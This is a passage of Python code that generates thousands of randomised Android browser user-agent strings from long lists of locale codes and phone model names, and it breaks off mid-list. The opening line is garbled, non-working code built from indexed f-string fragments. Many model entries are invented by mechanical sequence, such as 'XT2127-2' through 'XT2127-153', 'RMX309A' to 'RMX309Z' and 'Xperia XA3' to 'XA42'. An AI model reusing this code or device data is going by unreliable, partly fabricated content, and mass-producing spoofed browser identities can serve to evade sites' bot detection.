    result = [][f'''{a1}'''][f'''{a2}'''][f'''{a3}'''][f'''{a4}'''][f'''{a5}'''][f'''{a6}'''][f'''{a7}'''][f'''{a8}'''][f'''{a9}'''][f'''{a10}'''][f'''{a11}'''][f'''{a12}'''][' '][f'''{katana1}'''][f'''{katana2}'''][f'''{katana3}'''][f'''{katana4}'''][f'''{katana5}'''][f'''{katana6}'''][f'''{katana7}'''][f'''{katana8}'''][f'''{katana9}'''][f'''{katana10}'''][f'''{katana11}'''][f'''{katana12}'''][' '][f'''{mess1}'''][f'''{mess2}'''][f'''{mess3}'''][f'''{mess4}'''][f'''{mess5}'''][f'''{mess6}'''][f'''{mess7}'''][f'''{mess8}'''][f'''{mess9}'''][f'''{mess10}''']([][f'''{a1}'''][f'''{a2}'''][f'''{a3}'''][f'''{a4}'''][f'''{a5}'''][f'''{a6}'''][f'''{a7}'''][f'''{a8}'''][f'''{a9}'''][f'''{a10}'''][f'''{a11}'''][f'''{a12}'''][' '][f'''{katana1}'''][f'''{katana2}'''][f'''{katana3}'''][f'''{katana4}'''][f'''{katana5}'''][f'''{katana6}'''][f'''{katana7}'''][f'''{katana8}'''][f'''{katana9}'''][f'''{katana10}'''][f'''{katana11}'''][f'''{katana12}'''][' '][f'''{mess1}'''][f'''{mess2}'''][f'''{mess3}'''][f'''{mess4}'''][f'''{mess5}'''][f'''{mess6}'''][f'''{mess7}'''][f'''{mess8}'''][f'''{mess9}'''][f'''{mess10}'''][f'''{mess11}'''])
    useragent1.append(result)
    ugen = []
    useragent = []
    for xd in range(5000):
        aa = 'Mozilla/5.0 (Linux; U; Android'
        b = random.choice([
            '6',
            '7',
            '8',
            '9',
            '10',
            '11',
            '12',
            '13'])
        b1 = random.choice([
            'ar-AE',
            'af-ZA',
            'am-ET',
            'az-AZ',
            'be-BY',
            'bg-BG',
            'bn-BD',
            'bs-BA',
            'ca-ES',
            'cs-CZ',
            'cy-GB',
            'da-DK',
            'de-DE',
            'dv-MV',
            'el-GR',
            'en-DK',
            'en-US',
            'en-PH',
            'en-ER',
            'es-SV',
            'et-EE',
            'eu-ES',
            'fi-FI',
            'fr-FR',
            'fy-NL',
            'ga-IE',
            'gl-ES',
            'gu-IN',
            'he-IL',
            'hi-IN',
            'hr-HR',
            'hu-HU',
            'id-ID',
            'is-IS',
            'it-IT',
            'ja-JP',
            'ka-GE',
            'kk-KZ',
            'km-KH',
            'kn-IN',
            'ko-KR',
            'ky-KG',
            'lo-LA',
            'lt-LT',
            'lv-LV',
            'mk-MK',
            'ml-IN',
            'mn-MN',
            'mr-IN',
            'my-MM',
            'nb-NO',
            'ne-NP',
            'nl-NL',
            'nn-NO',
            'or-IN',
            'pa-IN',
            'pl-PL',
            'ps-AF',
            'pt-BR',
            'pt-PT',
            'ro-RO',
            'ru-RU',
            'si-LK',
            'sk-SK',
            'sl-SI',
            'sq-AL',
            'sr-RS',
            'sv-SE',
            'sw-KE',
            'ta-IN',
            'te-IN',
            'th-TH',
            'tr-TR',
            'ug-CN',
            'uk-UA',
            'ur-PK',
            'uz-UZ',
            'vi-VN',
            'wo-SN',
            'xh-ZA',
            'yi-001',
            'yo-NG',
            'zh-CN',
            'zh-HK',
            'zh-TW',
            'zu-ZA'])
        c = random.choice([
            'SM-A500F',
            'SM-A500FU',
            'SM-A500H',
            'SM-G532F',
            'SM-G900F',
            'SM-G920F',
            'SM-G930F',
            'SM-G935F',
            'SM-G950F',
            'SM-J320F',
            'SM-J320FN',
            'SM-J320H',
            'SM-J320M',
            'SM-J510FN',
            'SM-J701F',
            'SM-N920S',
            'SM-T111',
            'SM-T230',
            'SM-T231',
            'SM-T235',
            'SM-T280',
            'SM-T311',
            'SM-T315',
            'SM-T525',
            'SM-T531',
            'SM-T535',
            'SM-T555',
            'SM-T561',
            'SM-T705',
            'SM-T805',
            'SM-T820',
            'SPH-L720',
            'SM-S906E',
            'SM-G991',
            'SM-G981',
            'SM-G973',
            'SM-G960',
            'SM-G950',
            'SM-G930',
            'SM-G920',
            'SM-G900',
            'GT-I9500',
            'GT-I9300',
            'GT-I9100',
            'GT-I9000',
            'SM-N981',
            'SM-N970',
            'SM-N960',
            'SM-N950',
            'SM-N920',
            'SM-N910',
            'SM-N900',
            'GT-N7100',
            'GT-N7000',
            'SM-G991',
            'SM-G981',
            'SM-G973',
            'SM-G960',
            'SM-G950',
            'SM-G930',
            'SM-G920',
            'SM-G900',
            'GT-I9500',
            'GT-I9300',
            'GT-I9100',
            'GT-I9000',
            'SM-N981',
            'SM-N970',
            'SM-N960',
            'SM-N950',
            'SM-N920',
            'SM-N910',
            'SM-N900',
            'GT-N7100',
            'GT-N7000',
            'SM-A526B',
            'SM-A516B',
            'SM-A516N',
            'SM-A526U',
            'SM-A716U',
            'SM-A716V',
            'SM-A5260',
            'SM-A526W',
            'SM-A126U',
            'SM-A126V',
            'SM-A016G',
            'SM-A016B',
            'SM-A016M',
            'SM-A025M',
            'SM-A025F',
            'SM-A217F',
            'SM-A217M',
            'SM-A207F',
            'SM-A207M',
            'SM-A102U',
            'SM-A102U1',
            'SM-A102W',
            'SM-A102N',
            'SM-A1020',
            'SM-A105F',
            'SM-A105G',
            'SM-A105M',
            'SM-A202F',
            'SM-A202G',
            'SM-A202M',
            'SM-A125U',
            'SM-A125V',
            'SM-A022G',
            'SM-A022M',
            'SM-A027G',
            'SM-A027M',
            'SM-A2170',
            'SM-A115M',
            'SM-A107M',
            'SM-A107F',
            'SM-A107M',
            'SM-A0220',
            'SM-A115F',
            'SM-A102F',
            'SM-A1050',
            'Infinix X608',
            'Infinix X606B',
            'Infinix X559C',
            'Infinix Zero 3',
            'Infinix X5515F',
            'Infinix Hot 4 Pro',
            'Infinix X510',
            'GT-1015',
            'GT-1020',
            'GT-1030',
            'GT-1035',
            'GT-1040',
            'GT-1045',
            'GT-1050',
            'GT-1240',
            'GT-1440',
            'GT-1450',
            'GT-18190',
            'GT-18262',
            'GT-19060I',
            'GT-19082',
            'GT-19083',
            'GT-19105',
            'GT-19152',
            'GT-19192',
            'GT-19300',
            'GT-19505',
            'GT-2000',
            'GT-20000',
            'GT-200s',
            'GT-3000',
            'GT-414XOP',
            'GT-6918',
            'GT-7010',
            'GT-7020',
            'GT-7030',
            'GT-7040',
            'GT-7050',
            'GT-7100',
            'GT-7105',
            'GT-7110',
            'GT-7205',
            'GT-7210',
            'GT-7240R',
            'GT-7245',
            'GT-7303',
            'GT-7310',
            'GT-7320',
            'GT-7325',
            'GT-7326',
            'GT-7340',
            'GT-7405',
            'GT-7550',
            'GT-8005',
            'GT-8010',
            'GT-81',
            'GT-810',
            'GT-8105',
            'GT-8110',
            'GT-8220S',
            'GT-8410',
            'GT-9300',
            'GT-9320',
            'GT-93G',
            'GT-A7100',
            'GT-A9500',
            'GT-ANDROID',
            'GT-B2710',
            'GT-B5330',
            'GT-B5330B',
            'GT-B5330L',
            'GT-B5330ZKAINU',
            'GT-B5510',
            'GT-B5512',
            'GT-B5722',
            'GT-B7510',
            'GT-B7722',
            'GT-B7810',
            'GT-B9150',
            'GT-B9388',
            'GT-C3010',
            'GT-C3262',
            'GT-C3310R',
            'GT-C3312',
            'GT-C3312R',
            'GT-C3313T',
            'GT-C3322',
            'GT-C3322i',
            'GT-C3520',
            'GT-C3520I',
            'GT-C3592',
            'GT-C3595',
            'GT-C3782',
            'GT-C6712',
            'GT-E1282T',
            'GT-E1500',
            'GT-E2200',
            'GT-E2202',
            'GT-E2250',
            'GT-E2252',
            'GT-E2600',
            'GT-E2652W',
            'GT-E3210',
            'GT-E3309',
            'GT-E3309I',
            'GT-E3309T',
            'GT-G530H',
            'GT-g900f',
            'GT-G930F',
            'GT-H9500',
            'GT-I5508',
            'GT-I5801',
            'GT-I6410',
            'GT-I8150',
            'GT-I8160OKLTPA',
            'GT-I8160ZWLTTT',
            'GT-I8258',
            'GT-I8262D',
            'GT-I8268',
            'GT-I8505',
            'GT-I8530BAABTU',
            'GT-I8530BALCHO',
            'GT-I8530BALTTT',
            'GT-I8550E',
            'GT-i8700',
            'GT-I8750',
            'GT-I900',
            'GT-I9008L',
            'GT-i9040',
            'GT-I9080E',
            'GT-I9082C',
            'GT-I9082EWAINU',
            'GT-I9082i',
            'GT-I9100G',
            'GT-I9100LKLCHT',
            'GT-I9100M',
            'GT-I9100P',
            'GT-I9100T',
            'GT-I9105UANDBT',
            'GT-I9128E',
            'GT-I9128I',
            'GT-I9128V',
            'GT-I9158P',
            'GT-I9158V',
            'GT-I9168I',
            'GT-I9192I',
            'GT-I9195H',
            'GT-I9195L',
            'GT-I9250',
            'GT-I9303I',
            'GT-I9305N',
            'GT-I9308I',
            'GT-I9505G',
            'GT-I9505X',
            'GT-I9507V',
            'GT-I9600',
            'GT-m190',
            'GT-M5650',
            'GT-mini',
            'GT-N5000S',
            'GT-N5100',
            'GT-N5105',
            'GT-N5110',
            'GT-N5120',
            'GT-N7000B',
            'GT-N7005',
            'GT-N7100T',
            'GT-N7102',
            'GT-N7105',
            'GT-N7105T',
            'GT-N7108',
            'GT-N7108D',
            'GT-N8000',
            'GT-N8005',
            'GT-N8010',
            'GT-N8020',
            'GT-N9000',
            'GT-N9505',
            'GT-P1000CWAXSA',
            'GT-P1000M',
            'GT-P1000T',
            'GT-P1010',
            'GT-P3100B',
            'GT-P3105',
            'GT-P3108',
            'GT-P3110',
            'GT-P5100',
            'GT-P5200',
            'GT-P5210XD1',
            'GT-P5220',
            'GT-P6200',
            'GT-P6200L',
            'GT-P6201',
            'GT-P6210',
            'GT-P6211',
            'GT-P6800',
            'GT-P7100',
            'GT-P7300',
            'GT-P7300B',
            'GT-P7310',
            'GT-P7320',
            'GT-P7500D',
            'GT-P7500M',
            'GT-P7500R',
            'GT-P7500V',
            'GT-P7501',
            'GT-P7511',
            'GT-S3330',
            'GT-S3332',
            'GT-S3333',
            'GT-S3370',
            'GT-S3518',
            'GT-S3570',
            'GT-S3600i',
            'GT-S3650',
            'GT-S3653W',
            'GT-S3770K',
            'GT-S3770M',
            'GT-S3800W',
            'GT-S3802',
            'GT-S3850',
            'GT-S5220',
            'GT-S5220R',
            'GT-S5222',
            'GT-S5230',
            'GT-S5230W',
            'GT-S5233T',
            'GT-s5233w',
            'GT-S5250',
            'GT-S5253',
            'GT-s5260',
            'GT-S5280',
            'GT-S5282',
            'GT-S5283B',
            'GT-S5292',
            'GT-S5300',
            'GT-S5300L',
            'GT-S5301',
            'GT-S5301B',
            'GT-S5301L',
            'GT-S5302',
            'GT-S5302B',
            'GT-S5303',
            'GT-S5303B',
            'GT-S5310',
            'GT-S5310B',
            'GT-S5310C',
            'GT-S5310E',
            'GT-S5310G',
            'GT-S5310I',
            'GT-S5310L',
            'GT-S5310M',
            'GT-S5310N',
            'GT-S5312',
            'GT-S5312B',
            'GT-S5312C',
            'GT-S5312L',
            'GT-S5330',
            'GT-S5360',
            'GT-S5360B',
            'GT-S5360L',
            'GT-S5360T',
            'GT-S5363',
            'GT-S5367',
            'GT-S5369',
            'GT-S5380',
            'GT-S5380D',
            'GT-S5500',
            'GT-S5560',
            'GT-S5560i',
            'GT-S5570B',
            'GT-S5570I',
            'GT-S5570L',
            'GT-S5578',
            'GT-S5600',
            'GT-S5603',
            'GT-S5610',
            'GT-S5610K',
            'GT-S5611',
            'GT-S5620',
            'GT-S5670',
            'GT-S5670B',
            'GT-S5670HKBZTA',
            'GT-S5690',
            'GT-S5690R',
            'GT-S5830',
            'GT-S5830D',
            'GT-S5830G',
            'GT-S5830i',
            'GT-S5830L',
            'GT-S5830M',
            'GT-S5830T',
            'GT-S5830V',
            'GT-S5831i',
            'GT-S5838',
            'GT-S5839i',
            'GT-S6010',
            'GT-S6010BBABTU',
            'GT-S6012',
            'GT-S6012B',
            'GT-S6102',
            'GT-S6102B',
            'GT-S6293T',
            'GT-S6310B',
            'GT-S6310ZWAMID',
            'GT-S6312',
            'GT-S6313T',
            'GT-S6352',
            'GT-S6500',
            'GT-S6500D',
            'GT-S6500L',
            'GT-S6790',
            'GT-S6790L',
            'GT-S6790N',
            'GT-S6792L',
            'GT-S6800',
            'GT-S6800HKAXFA',
            'GT-S6802',
            'GT-S6810',
            'GT-S6810B',
            'GT-S6810E',
            'GT-S6810L',
            'GT-S6810M',
            'GT-S6810MBASER',
            'GT-S6810P',
            'GT-S6812',
            'GT-S6812B',
            'GT-S6812C',
            'GT-S6812i',
            'GT-S6818',
            'GT-S6818V',
            'GT-S7230E',
            'GT-S7233E',
            'GT-S7250D',
            'GT-S7262',
            'GT-S7270',
            'GT-S7270L',
            'GT-S7272',
            'GT-S7272C',
            'GT-S7273T',
            'GT-S7278',
            'GT-S7278U',
            'GT-S7390',
            'GT-S7390G',
            'GT-S7390L',
            'GT-S7392',
            'GT-S7392L',
            'GT-S7500',
            'GT-S7500ABABTU',
            'GT-S7500ABADBT',
            'GT-S7500ABTTLP',
            'GT-S7500CWADBT',
            'GT-S7500L',
            'GT-S7500T',
            'GT-S7560',
            'GT-S7560M',
            'GT-S7562',
            'GT-S7562C',
            'GT-S7562i',
            'GT-S7562L',
            'GT-S7566',
            'GT-S7568',
            'GT-S7568I',
            'GT-S7572',
            'GT-S7580E',
            'GT-S7583T',
            'GT-S758X',
            'GT-S7592',
            'GT-S7710',
            'GT-S7710L',
            'GT-S7898',
            'GT-S7898I',
            'GT-S8500',
            'GT-S8530',
            'GT-S8600',
            'GT-STB919',
            'GT-T140',
            'GT-T150',
            'GT-V8a',
            'GT-V8i',
            'GT-VC818',
            'GT-VM919S',
            'GT-W131',
            'GT-W153',
            'GT-X831',
            'GT-X853',
            'GT-X870',
            'GT-X890',
            'GT-Y8750',
            'V2056',
            'V2112A',
            'V2112',
            'V2122A',
            'V2120A',
            'V2120',
            'V2116A',
            'V2114A',
            'V2112A',
            'V2010A',
            'V2019A',
            'V2010',
            'V2003A',
            'V2002A',
            'V2002',
            'V1932A',
            'V1932T',
            'V1932',
            'V1929A',
            'V1928A',
            'V1928T',
            'V1928',
            'V1927A',
            'V1926A',
            'V1925A',
            'V1925',
            'V1924A',
            'V1922A',
            'V1921A',
            'V1921',
            'V1920A',
            'V1919A',
            'V1916A',
            'V1916',
            'V1912A',
            'V1911A',
            'V1910A',
            'V1910',
            'V1909A',
            'V1907A',
            'V1905',
            'V1903A',
            'V1901A',
            'V1901T',
            'V1901',
            'V1836',
            'V1824A',
            'V1824T',
            'V1824',
            'V1818A',
            'V1818T',
            'V1813A',
            'V1813T',
            'V1813',
            'V1812A',
            'V1811A',
            'V1811T',
            'V1811',
            'V1808A',
            'V1808T',
            'V1808',
            'V1801A',
            'V1801T',
            'V1801',
            'V1730T',
            'V1730F',
            'V1730A',
            'V1730',
            'V1724A',
            'V1723A',
            'V1723',
            'V1721A',
            'V1720A',
            'V1720T',
            'V1720',
            'V1716A',
            'V1715A',
            'V1715',
            'V1713A',
            'V1713',
            'V1712A',
            'V1712',
            'V1711T',
            'V1711A',
            'V1711',
            'V1709A',
            'V1709T',
            'V1709',
            'V1708A',
            'V1708T',
            'V1707A',
            'V1707T',
            'V1706T',
            'V1706',
            'V1703A',
            'V1701A',
            'V1701',
            'V1624A',
            'V1623A',
            'V1622A',
            'V1622',
            'V1621A',
            'V1619',
            'V1618A',
            'V1617A',
            'V1616',
            'V1615T',
            'V1614T',
            'V1613',
            'V1611T',
            'V1611',
            'V1608A',
            'V1609',
            'V1605',
            'V1604',
            'V1603',
            'V1601',
            'V1570',
            'V1562',
            'V1561',
            'V1550',
            'V1548',
            'V1546',
            'V1543',
            'V1542',
            'V1540',
            'V1530',
            'V1520',
            'V1510',
            'V1500',
            'V1420',
            'V1400',
            'V1310',
            'V1320',
            'XT2127-2',
            'XT2127-4',
            'XT2127-5',
            'XT2127-6',
            'XT2127-7',
            'XT2127-8',
            'XT2127-10',
            'XT2127-11',
            'XT2127-12',
            'XT2127-13',
            'XT2127-14',
            'XT2127-15',
            'XT2127-16',
            'XT2127-17',
            'XT2127-18',
            'XT2127-19',
            'XT2127-20',
            'XT2127-21',
            'XT2127-22',
            'XT2127-23',
            'XT2127-24',
            'XT2127-25',
            'XT2127-26',
            'XT2127-27',
            'XT2127-28',
            'XT2127-29',
            'XT2127-30',
            'XT2127-31',
            'XT2127-32',
            'XT2127-33',
            'XT2127-34',
            'XT2127-35',
            'XT2127-36',
            'XT2127-37',
            'XT2127-38',
            'XT2127-39',
            'XT2127-40',
            'XT2127-41',
            'XT2127-42',
            'XT2127-43',
            'XT2127-44',
            'XT2127-45',
            'XT2127-46',
            'XT2127-47',
            'XT2127-48',
            'XT2127-49',
            'XT2127-50',
            'XT2127-51',
            'XT2127-52',
            'XT2127-53',
            'XT2127-54',
            'XT2127-55',
            'XT2127-56',
            'XT2127-57',
            'XT2127-58',
            'XT2127-59',
            'XT2127-60',
            'XT2127-61',
            'XT2127-62',
            'XT2127-63',
            'XT2127-64',
            'XT2127-65',
            'XT2127-66',
            'XT2127-67',
            'XT2127-68',
            'XT2127-69',
            'XT2127-70',
            'XT2127-71',
            'XT2127-72',
            'XT2127-73',
            'XT2127-74',
            'XT2127-75',
            'XT2127-76',
            'XT2127-77',
            'XT2127-78',
            'XT2127-79',
            'XT2127-80',
            'XT2127-81',
            'XT2127-82',
            'XT2127-83',
            'XT2127-84',
            'XT2127-85',
            'XT2127-86',
            'XT2127-87',
            'XT2127-88',
            'XT2127-89',
            'XT2127-90',
            'XT2127-91',
            'XT2127-92',
            'XT2127-93',
            'XT2127-94',
            'XT2127-95',
            'XT2127-96',
            'XT2127-97',
            'XT2127-98',
            'XT2127-99',
            'XT2127-100',
            'XT2127-101',
            'XT2127-102',
            'XT2127-103',
            'XT2127-104',
            'XT2127-105',
            'XT2127-106',
            'XT2127-107',
            'XT2127-108',
            'XT2127-109',
            'XT2127-110',
            'XT2127-111',
            'XT2127-112',
            'XT2127-113',
            'XT2127-114',
            'XT2127-115',
            'XT2127-116',
            'XT2127-117',
            'XT2127-118',
            'XT2127-119',
            'XT2127-120',
            'XT2127-121',
            'XT2127-122',
            'XT2127-123',
            'XT2127-124',
            'XT2127-125',
            'XT2127-126',
            'XT2127-127',
            'XT2127-128',
            'XT2127-129',
            'XT2127-130',
            'XT2127-131',
            'XT2127-132',
            'XT2127-133',
            'XT2127-134',
            'XT2127-135',
            'XT2127-136',
            'XT2127-137',
            'XT2127-138',
            'XT2127-139',
            'XT2127-140',
            'XT2127-141',
            'XT2127-142',
            'XT2127-143',
            'XT2127-144',
            'XT2127-145',
            'XT2127-146',
            'XT2127-147',
            'XT2127-148',
            'XT2127-149',
            'XT2127-150',
            'XT2127-151',
            'XT2127-152',
            'XT2127-153',
            'RMX3142',
            'RMX3185',
            'RMX3186',
            'RMX3281',
            'RMX3274',
            'RMX3361',
            'RMX3165',
            'RMX3243',
            'RMX3242',
            'RMX3294',
            'RMX3162',
            'RMX3241',
            'RMX3290',
            'RMX3289',
            'RMX3270',
            'RMX3267',
            'RMX3266',
            'RMX3263',
            'RMX3260',
            'RMX3240',
            'RMX3280',
            'RMX3276',
            'RMX3244',
            'RMX3121',
            'RMX3063',
            'RMX3061',
            'RMX3090',
            'RMX3091',
            'RMX3080',
            'RMX3211',
            'RMX3334',
            'RMX3221',
            'RMX3295',
            'RMX3292',
            'RMX3331',
            'RMX3383',
            'RMX3350',
            'RMX3332',
            'RMX3300',
            'RMX3310',
            'RMX3311',
            'RMX3385',
            'RMX3336',
            'RMX3337',
            'RMX3338',
            'RMX3235',
            'RMX3225',
            'RMX3124',
            'RMX3065',
            'RMX3143',
            'RMX3201',
            'RMX3070',
            'RMX3250',
            'RMX3246',
            'RMX3261',
            'RMX3071',
            'RMX3150',
            'RMX3164',
            'RMX3141',
            'RMX3063',
            'RMX3060',
            'RMX3357',
            'RMX3223',
            'RMX3330',
            'RMX3284',
            'RMX3362',
            'RMX3236',
            'RMX3193',
            'RMX3191',
            'RMX3358',
            'RMX3384',
            'RMX3262',
            'RMX3248',
            'RMX3339',
            'RMX3283',
            'RMX3195',
            'RMX3093',
            'RMX3098',
            'RMX3245',
            'RMX3095',
            'RMX3064',
            'RMX3341',
            'RMX3340',
            'RMX3365',
            'RMX3363',
            'RMX3364',
            'RMX3366',
            'RMX3367',
            'RMX3368',
            'RMX3369',
            'RMX3370',
            'RMX3371',
            'RMX3372',
            'RMX3373',
            'RMX3374',
            'RMX3375',
            'RMX3376',
            'RMX3377',
            'RMX3378',
            'RMX3379',
            'RMX3380',
            'RMX3381',
            'RMX3382',
            'RMX3312',
            'RMX3249',
            'RMX3094',
            'RMX3116',
            'RMX3187',
            'RMX3096',
            'RMX3097',
            'RMX3171',
            'RMX3152',
            'RMX3115',
            'RMX3081',
            'RMX3272',
            'RMX3273',
            'RMX3264',
            'RMX3265',
            'RMX3269',
            'RMX3268',
            'RMX3082',
            'RMX3083',
            'RMX3084',
            'RMX3085',
            'RMX3086',
            'RMX3087',
            'RMX3088',
            'RMX3089',
            'RMX3099',
            'RMX309A',
            'RMX309B',
            'RMX309C',
            'RMX309D',
            'RMX309E',
            'RMX309F',
            'RMX309G',
            'RMX309H',
            'RMX309I',
            'RMX309J',
            'RMX309K',
            'RMX309L',
            'RMX309M',
            'RMX309N',
            'RMX309O',
            'RMX309P',
            'RMX309Q',
            'RMX309R',
            'RMX309S',
            'RMX309T',
            'RMX309U',
            'RMX309V',
            'RMX309W',
            'RMX309X',
            'RMX309Y',
            'RMX309Z',
            'RMX31ZM',
            'RMX31ZN',
            'RMX31ZS',
            'RMX31ZT',
            'RMX31ZW',
            'RMX31ZV',
            'RMX31ZR',
            'RMX31ZQ',
            'RMX31ZP',
            'RMX31ZO',
            'RMX31ZN',
            'RMX31ZM',
            'RMX31ZL',
            'RMX31ZK',
            'RMX31ZJ',
            'RMX31ZI',
            'RMX31ZH',
            'RMX31ZG',
            'RMX31ZF',
            'RMX31ZE',
            'RMX31ZD',
            'RMX31ZC',
            'CPH1903',
            'CPH1803',
            'CPH1859',
            'CPH1969',
            'CPH1989',
            'CPH1919',
            'CPH1941',
            'CPH1983',
            'CPH1963',
            'CPH1879',
            'CPH1831',
            'CPH2035',
            'CPH2069',
            'CPH1987',
            'CPH2071',
            'CPH2083',
            'CPH2015',
            'CPH2019',
            'CPH2173',
            'CPH2089',
            'CPH2067',
            'CPH2017',
            'CPH2087',
            'CPH2205',
            'CPH2251',
            'CPH2197',
            'CPH2235',
            'CPH2347',
            'CPH2295',
            'CPH2249',
            'CPH2243',
            'CPH2349',
            'CPH2359',
            'CPH2383',
            'CPH2381',
            'CPH2239',
            'CPH2213',
            'CPH2129',
            'CPH2195',
            'CPH2227',
            'CPH2316',
            'CPH2353',
            'CPH2261',
            'CPH2225',
            'CPH2269',
            'CPH2073',
            'CPH2185',
            'CPH1877',
            'CPH2013',
            'CPH2061',
            'CPH1955',
            'CPH1871',
            'CPH1801',
            'CPH1873',
            'CPH1901',
            'CPH1809',
            'CPH1853',
            'CPH1923',
            'CPH1981',
            'CPH1833',
            'CPH1917',
            'CPH1967',
            'CPH1937',
            'CPH1893',
            'CPH1931',
            'CPH1921',
            'CPH1823',
            'CPH2023',
            'CPH2021',
            'CPH2103',
            'CPH2220',
            'CPH2127',
            'CPH2059',
            'CPH2139',
            'CPH2253',
            'CPH2267',
            'CPH2263',
            'CPH2247',
            'CPH2241',
            'CPH2297',
            'CPH2357',
            'CPH2255',
            'CPH2345',
            'CPH2329',
            'CPH2209',
            'CPH2191',
            'CPH2199',
            'CPH2289',
            'CPH2319',
            'CPH2343',
            'CPH2363',
            'CPH2161',
            'CPH2163',
            'CPH1979',
            'CPH1977',
            'CPH1973',
            'CPH1965',
            'CPH1959',
            'CPH1951',
            'CPH1913',
            'CPH1909',
            'CPH1905',
            'CPH1861',
            'CPH1863',
            'CPH1967',
            'CPH1933',
            'CPH1937',
            'CPH1921',
            'CPH1923',
            'CPH1987',
            'CPH1919',
            'CPH1897',
            'CPH1875',
            'CPH1874',
            'CPH1872',
            'CPH1865',
            'CPH1863',
            'CPH1862',
            'CPH1853',
            'CPH1852',
            'CPH1851',
            'CPH1843',
            'CPH1841',
            'CPH1835',
            'CPH1833',
            'CPH1832',
            'CPH1831',
            'CPH1825',
            'CPH1823',
            'CPH1821',
            'CPH1819',
            'CPH1813',
            'CPH1812',
            'CPH1811',
            'CPH1809',
            'CPH1808',
            'CPH1807',
            'CPH1805',
            'CPH1803',
            'CPH1801',
            'Meizu 18s',
            'Meizu 18',
            'Meizu 17 Pro',
            'Meizu 17',
            'Meizu 16s Pro',
            'Meizu 16s',
            'Meizu 16T',
            'Meizu 16Xs',
            'Meizu 16X',
            'Meizu 16th Plus',
            'Meizu 16th',
            'Meizu 15 Plus',
            'Meizu 15',
            'Meizu 15 Lite',
            'Meizu 16s Plus',
            'Meizu 16',
            'Meizu 16 Max',
            'Meizu 16 Note',
            'Meizu 16s Plus',
            'Meizu 16',
            'Meizu 16X',
            'Meizu 16th Plus',
            'Meizu 16th',
            'Meizu 15 Plus',
            'Meizu 15',
            'Meizu 15 Lite',
            'Meizu M6T',
            'Meizu M6s',
            'Meizu M6 Note',
            'Meizu M6',
            'Meizu M5c',
            'Meizu M5s',
            'Meizu M5 Note',
            'Meizu M5',
            'Meizu M5c',
            'Meizu M5s',
            'Meizu M5 Note',
            'Meizu M5',
            'Meizu M5c',
            'Meizu M5s',
            'Meizu M5 Note',
            'Meizu M5',
            'Meizu M5c',
            'Meizu M5s',
            'Meizu M5 Note',
            'Meizu M5',
            'S41',
            'S31',
            'S21',
            'S12',
            'S11',
            'A56',
            'A55',
            'A54',
            'A23',
            'A16',
            'A15',
            'P36 Pro',
            'P36',
            'P33 Plus',
            'P33',
            'P32',
            'P31',
            'A88',
            'A47',
            'A46',
            'A45',
            'A44',
            'A41 Plus',
            'A41',
            'A25 Pro',
            'A25',
            'A23 Pro',
            'A22 Pro',
            'A22',
            'A21',
            'A16 Plus',
            'A16S',
            'A16',
            'A14',
            'A13 Plus',
            'A13',
            'A11',
            'A10',
            'Vision 1 Plus',
            'Vision 1',
            'S13 Pro',
            'S13',
            'S12 Lite',
            'S11 Lite',
            'S11 Pro',
            'S11 Plus',
            'S10',
            'S15',
            'S14',
            'S13P',
            'S12',
            'S11',
            'S10',
            'S15',
            'S14',
            'S13P',
            'S12',
            'S11',
            'S10',
            'S15',
            'S14',
            'S13P',
            'S12',
            'S11',
            'S10',
            'Camon 16 Premier',
            'Camon 16 Pro',
            'Camon 16',
            'Camon 15 Premier',
            'Camon 15 Pro',
            'Camon 15',
            'Spark 6',
            'Spark 5 Pro',
            'Spark 5',
            'Pova',
            'Pouvoir 4 Pro',
            'Pouvoir 4',
            'Phantom 9',
            'Phantom X',
            'Camon 12 Pro',
            'Camon 12',
            'Camon 11',
            'Camon 11 Pro',
            'Camon 11S',
            'Spark 4',
            'Spark 4 Air',
            'Spark 3 Pro',
            'Spark 3',
            'Spark 2',
            'Pouvoir 3 Plus',
            'Pouvoir 3',
            'Phantom 8',
            'Phantom 6',
            'Phantom 6 Plus',
            'Camon X Pro',
            'Camon X',
            'Camon CM',
            'Camon CX Air',
            'Camon CX',
            'Spark Plus K9',
            'Spark K7',
            'Spark Plus K9',
            'Spark K7 Plus',
            'Boom J8',
            'Boom J7',
            'Boom J5',
            'Boom J9 Plus',
            'Boom J10',
            'Pop 3',
            'Pop 2 Plus',
            'Pop 2 Power',
            'Pop 2F',
            'Pop 1',
            'F1',
            'F2',
            'F3',
            'F4',
            'F5',
            'Xperia 1',
            'Xperia 5',
            'Xperia 10',
            'Xperia L4',
            'Xperia XZ3',
            'Xperia XZ2',
            'Xperia XZ1',
            'Xperia XA2',
            'Xperia XA1',
            'Xperia XZs',
            'Xperia XZ',
            'Xperia X Compact',
            'Xperia XA Ultra',
            'Xperia XA',
            'Xperia X Performance',
            'Xperia XA1 Ultra',
            'Xperia XA2 Ultra',
            'Xperia XZ2 Premium',
            'Xperia XZ2 Compact',
            'Xperia 10 Plus',
            'Xperia L3',
            'Xperia 1 II',
            'Xperia 5 II',
            'Xperia 10 II',
            'Xperia 10 III',
            'Xperia L5',
            'Xperia XZ4',
            'Xperia XZ4 Compact',
            'Xperia XZ Premium',
            'Xperia XZ1 Compact',
            'Xperia XA3',
            'Xperia XA4',
            'Xperia XA5',
            'Xperia XA6',
            'Xperia XA7',
            'Xperia XA8',
            'Xperia XA9',
            'Xperia XA10',
            'Xperia XA11',
            'Xperia XA12',
            'Xperia XA13',
            'Xperia XA14',
            'Xperia XA15',
            'Xperia XA16',
            'Xperia XA17',
            'Xperia XA18',
            'Xperia XA19',
            'Xperia XA20',
            'Xperia XA21',
            'Xperia XA22',
            'Xperia XA23',
            'Xperia XA24',
            'Xperia XA25',
            'Xperia XA26',
            'Xperia XA27',
            'Xperia XA28',
            'Xperia XA29',
            'Xperia XA30',
            'Xperia XA31',
            'Xperia XA32',
            'Xperia XA33',
            'Xperia XA34',
            'Xperia XA35',
            'Xperia XA36',
            'Xperia XA37',
            'Xperia XA38',
            'Xperia XA39',
            'Xperia XA40',
            'Xperia XA41',
            'Xperia XA42',
            'ZenFone 8',
            'ROG Phone 5',
            'ZenFone 7',
            'ROG Phone 3',
            'ZenFone 6',
            'ROG Phone II',
            'ZenFone 5Z',
            'ZenFone 5',
            'ZenFone 4 Pro',
            'ZenFone 4',
            'ZenFone 3 Deluxe',
            'ZenFone 3',
            'ZenFone 2 Laser',
            'ZenFone 2',
            'ZenFone',
            'ZenFone 6Z',
            'ZenFone Max Pro (M2)',
            'ZenFone Max Pro (M1)',
            'ZenFone 6Z',
            'ZenFone Max Plus (M2)',
            'ZenFone Max (M2)',
            'ZenFone Max (M1)',
            'ZenFone Live',
            'ZenFone Zoom',
            'ZenFone Selfie',
